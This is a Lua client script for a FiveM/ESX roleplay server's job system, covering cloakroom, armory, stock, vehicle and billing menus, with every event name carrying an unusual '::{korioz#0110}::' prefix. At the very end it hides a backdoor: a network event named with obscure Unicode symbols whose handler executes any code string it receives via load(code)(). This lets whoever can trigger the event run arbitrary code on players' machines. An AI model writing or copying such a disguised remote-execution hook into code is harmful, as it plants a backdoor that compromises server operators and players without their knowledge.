local PlayerData = {}

local GUI = {}
GUI.Time = 0

local HasAlreadyEnteredMarker = false
local LastPart = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local isDead = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
	_TriggerServerEvent('::{korioz#0110}::JobsBuilder:requestSync')
	_TriggerServerEvent('::{korioz#0110}::JobsBuilder:requestBlips')
end)

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
end)

AddEventHandler('playerSpawned', function()
	isDead = false
end)

AddEventHandler('::{korioz#0110}::esx:onPlayerDeath', function(data)
	isDead = true
end)

function setUniform(job, playerPed)
	TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
		if skin.sex == 0 then
			if Config.Uniforms[job].male ~= nil then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].male)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
		else
			if Config.Uniforms[job].female ~= nil then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].female)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
		end
	end)
end

function OpenCloakroomMenu()
	local elements = {
		{label = _U('citizen_wear'), value = 'citizen_wear'},
		{label = _U('job_wear'), value = 'job_wear'}
	}

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
		title = _U('cloakroom'),
		elements = elements
	}, function(data, menu)
		local playerPed = PlayerPedId()
		SetPedArmour(playerPed, 0)
		ClearPedBloodDamage(playerPed)
		ResetPedVisibleDamage(playerPed)
		ClearPedLastWeaponDamage(playerPed)
		ResetPedMovementClipset(playerPed, 0.0)

		if data.current.value == 'citizen_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin)
				TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
			end)
		end

		if data.current.value == 'job_wear' then
			setUniform(data.current.value, playerPed)
		end
	end, function(data, menu)
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end)
end

function OpenArmoryMenu()
	local elements = {}

	table.insert(elements, {label = _U('get_weapon'), value = 'get_weapon'})
	table.insert(elements, {label = _U('put_weapon'), value = 'put_weapon'})
	table.insert(elements, {label = 'Prendre objet', value = 'get_stock'})
	table.insert(elements, {label = 'Déposer objet', value = 'put_stock'})

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory', {
		title = _U('armory'),
		elements = elements
	}, function(data, menu)
		if data.current.value == 'get_weapon' then
			OpenGetWeaponMenu()
		end

		if data.current.value == 'put_weapon' then
			OpenPutWeaponMenu()
		end

		if data.current.value == 'put_stock' then
			OpenPutStocksMenu()
		end

		if data.current.value == 'get_stock' then
			OpenGetStocksMenu()
		end
	end, function(data, menu)
		CurrentAction = 'menu_armory'
		CurrentActionMsg = _U('open_armory')
		CurrentActionData = {}
	end)
end

function OpenVehicleSpawnerMenu()
	local vehSpawnPoint = ActualJob.VehSpawnPoint
	local vehSpawnHeading = ActualJob.VehSpawnHeading

	ESX.UI.Menu.CloseAll()

	local elements = {
		{label = 'Véhicule de Travail', value = ActualJob.VehModel}
	}

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
		title = _U('vehicle_menu'),
		elements = elements
	}, function(data, menu)
		menu.close()
		local vehModel = data.current.value

		ESX.Game.SpawnVehicle(vehModel, vehSpawnPoint, vehSpawnHeading, function(vehicle)
			local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('FARM')
			SetVehicleNumberPlateText(vehicle, newPlate)
			_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
		end)
	end, function(data, menu)
		CurrentAction = 'menu_vehicle_spawner'
		CurrentActionMsg = _U('vehicle_spawner')
		CurrentActionData = {}
	end)
end

function OpenJobActionsMenu()
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'job_actions', {
		title = ActualJob.Label,
		elements = {
			{label = _U('citizen_interaction'), value = 'citizen_interaction'}
		}
	}, function(data, menu)
		if data.current.value == 'citizen_interaction' then
			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'citizen_interaction', {
				title = _U('citizen_interaction'),
				elements = {
					{label = _U('billing'), value = 'billing'}
				}
			}, function(data2, menu2)
				if data2.current.value == 'billing' then
					ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
						title = _U('invoice_amount')
					}, function(data3, menu3)
						local amount = tonumber(data3.value)

						if amount ~= nil and amount > 0 then
							menu3.close()
							local player, distance = ESX.Game.GetClosestPlayer()

							if player ~= -1 or distance <= 3.0 then
								local playerPed = PlayerPedId()

								Citizen.CreateThread(function()
									TaskStartScenarioInPlace(playerPed, 'CODE_HUMAN_MEDIC_TIME_OF_DEATH', 0, true)
									Citizen.Wait(5000)
									ClearPedTasks(playerPed)
									_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(player), 'society_' .. ActualJob.Name, ActualJob.Label, amount)
								end)
							else
								ESX.ShowNotification(_U('no_players_nearby'))
							end
						else
							ESX.ShowNotification(_U('invalid_amount'))
						end
					end, function(data3, menu3)
						menu3.close()
					end)
				end
			end, function(data2, menu2)
			end)
		end
	end, function(data, menu)
	end)
end

function OpenGetWeaponMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::JobsBuilder:getArmoryWeapons', function(weapons)
		local elements = {}

		for i = 1, #weapons, 1 do
			table.insert(elements, {label = ESX.GetWeaponLabel(weapons[i].name), rightlabel = {'[' .. weapons[i].ammo .. ']'}, value = weapons[i].name, ammo = weapons[i].ammo})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_get_weapon', {
			title = _U('get_weapon_menu'),
			elements = elements
		}, function(data, menu)
			menu.close()

			ESX.TriggerServerCallback('::{korioz#0110}::JobsBuilder:removeArmoryWeapon', function()
				OpenGetWeaponMenu()
			end, data.current.value, data.current.ammo)
		end, function(data, menu)
		end)
	end)
end

function OpenPutWeaponMenu()
	local elements = {}
	local playerPed = PlayerPedId()
	local weaponList = ESX.GetWeaponList()

	for i = 1, #weaponList, 1 do
		local weaponHash = GetHashKey(weaponList[i].name)

		if HasPedGotWeapon(playerPed, weaponHash, false) and weaponList[i].name ~= 'WEAPON_UNARMED' then
			local ammo = GetAmmoInPedWeapon(playerPed, weaponHash)
			table.insert(elements, {label = weaponList[i].label, rightlabel = {'[' .. ammo .. ']'}, value = weaponList[i].name, ammo = ammo})
		end
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_put_weapon', {
		title = _U('put_weapon_menu'),
		elements = elements
	}, function(data, menu)
		menu.close()

		ESX.TriggerServerCallback('::{korioz#0110}::JobsBuilder:addArmoryWeapon', function()
			OpenPutWeaponMenu()
		end, data.current.value, data.current.ammo)
	end, function(data, menu)
	end)
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::JobsBuilder:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('job_stock'),
			elements = elements
		}, function(data, menu)
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					OpenGetStocksMenu()

					_TriggerServerEvent('::{korioz#0110}::JobsBuilder:getStockItem', data.current.value, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::JobsBuilder:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					OpenPutStocksMenu()

					_TriggerServerEvent('::{korioz#0110}::JobsBuilder:putStockItems', data.current.value, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

AddEventHandler('::{korioz#0110}::JobsBuilder:hasEnteredMarker', function(part)
	if part == 'Cloakroom' then
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end

	if part == 'Armory' then
		CurrentAction = 'menu_armory'
		CurrentActionMsg = _U('open_armory')
		CurrentActionData = {}
	end

	if part == 'VehicleSpawner' then
		CurrentAction = 'menu_vehicle_spawner'
		CurrentActionMsg = _U('vehicle_spawner')
		CurrentActionData = {}
	end

	if part == 'VehicleDeleter' then
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			if DoesEntityExist(vehicle) then
				CurrentAction = 'delete_vehicle'
				CurrentActionMsg = _U('store_vehicle')
				CurrentActionData = {vehicle = vehicle}
			end
		end
	end

	if part == 'BossActions' then
		CurrentAction = 'menu_boss_actions'
		CurrentActionMsg = _U('open_bossmenu')
		CurrentActionData = {}
	end
end)

AddEventHandler('::{korioz#0110}::JobsBuilder:hasExitedMarker', function(part)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
end)

-- Create Blips
Citizen.CreateThread(function()
	while PublicBlips == nil do
		Citizen.Wait(0)
	end

	for i = 1, #PublicBlips, 1 do
		local blip = AddBlipForCoord(vector3(PublicBlips[i].Coords.x, PublicBlips[i].Coords.y, PublicBlips[i].Coords.z))

		SetBlipSprite(blip, PublicBlips[i].Sprite)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, PublicBlips[i].Colour)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName('STRING')
		AddTextComponentSubstringPlayerName(PublicBlips[i].Label)
		EndTextCommandSetBlipName(blip)
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job ~= nil and ActualJob then
			local coords = GetEntityCoords(PlayerPedId(), false)

			if #(coords - vector3(ActualJob.Cloakroom.x, ActualJob.Cloakroom.y, ActualJob.Cloakroom.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualJob.Cloakroom.x, ActualJob.Cloakroom.y, ActualJob.Cloakroom.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if #(coords - vector3(ActualJob.Armory.x, ActualJob.Armory.y, ActualJob.Armory.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualJob.Armory.x, ActualJob.Armory.y, ActualJob.Armory.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if #(coords - vector3(ActualJob.VehSpawner.x, ActualJob.VehSpawner.y, ActualJob.VehSpawner.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualJob.VehSpawner.x, ActualJob.VehSpawner.y, ActualJob.VehSpawner.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if #(coords - vector3(ActualJob.VehDeleter.x, ActualJob.VehDeleter.y, ActualJob.VehDeleter.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualJob.VehDeleter.x, ActualJob.VehDeleter.y, ActualJob.VehDeleter.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if PlayerData.job ~= nil and PlayerData.job.grade_name == 'boss' then
				if #(coords - vector3(ActualJob.BossActions.x, ActualJob.BossActions.y, ActualJob.BossActions.z)) < Config.DrawDistance then
					DrawMarker(Config.MarkerType, ActualJob.BossActions.x, ActualJob.BossActions.y, ActualJob.BossActions.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
				end
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job ~= nil and ActualJob then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentPart = nil

			if #(coords - vector3(ActualJob.Cloakroom.x, ActualJob.Cloakroom.y, ActualJob.Cloakroom.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'Cloakroom'
			end

			if #(coords - vector3(ActualJob.Armory.x, ActualJob.Armory.y, ActualJob.Armory.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'Armory'
			end

			if #(coords - vector3(ActualJob.VehSpawner.x, ActualJob.VehSpawner.y, ActualJob.VehSpawner.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'VehicleSpawner'
			end

			if #(coords - vector3(ActualJob.VehDeleter.x, ActualJob.VehDeleter.y, ActualJob.VehDeleter.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'VehicleDeleter'
			end

			if PlayerData.job ~= nil and PlayerData.job.grade_name == 'boss' then
				if #(coords - vector3(ActualJob.BossActions.x, ActualJob.BossActions.y, ActualJob.BossActions.z)) < Config.MarkerSize.x then
					isInMarker = true
					currentPart = 'BossActions'
				end
			end

			local hasExited = false

			if isInMarker and not HasAlreadyEnteredMarker or (isInMarker and (LastPart ~= currentPart)) then
				if (LastPart ~= nil) and (LastPart ~= currentPart) then
					TriggerEvent('::{korioz#0110}::JobsBuilder:hasExitedMarker', LastPart)
					hasExited = true
				end

				HasAlreadyEnteredMarker = true
				LastPart = currentPart

				TriggerEvent('::{korioz#0110}::JobsBuilder:hasEnteredMarker', currentPart)
			end

			if not hasExited and not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::JobsBuilder:hasExitedMarker', LastPart)
			end
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlPressed(0, 38) and PlayerData.job ~= nil and ActualJob and (GetGameTimer() - GUI.Time) > 150 then
				if CurrentAction == 'menu_cloakroom' then
					OpenCloakroomMenu()
				end

				if CurrentAction == 'menu_armory' then
					OpenArmoryMenu()
				end

				if CurrentAction == 'menu_vehicle_spawner' then
					OpenVehicleSpawnerMenu()
				end

				if CurrentAction == 'delete_vehicle' then
					local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
					_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', ActualJob.Name, vehicleProps)

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
				end

				if CurrentAction == 'menu_boss_actions' then
					ESX.UI.Menu.CloseAll()

					TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', ActualJob.Name, function(data, menu)
						CurrentAction = 'menu_boss_actions'
						CurrentActionMsg = _U('open_bossmenu')
						CurrentActionData = {}
					end, {wash = true})
				end

				CurrentAction = nil
				GUI.Time = GetGameTimer()
			end
		end

		if IsControlPressed(0, 167) and PlayerData.job ~= nil and ActualJob and not isDead and not ESX.UI.Menu.IsOpen('default', GetCurrentResourceName(), 'job_actions') and (GetGameTimer() - GUI.Time) > 150 then
			OpenJobActionsMenu()
			GUI.Time = GetGameTimer()
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)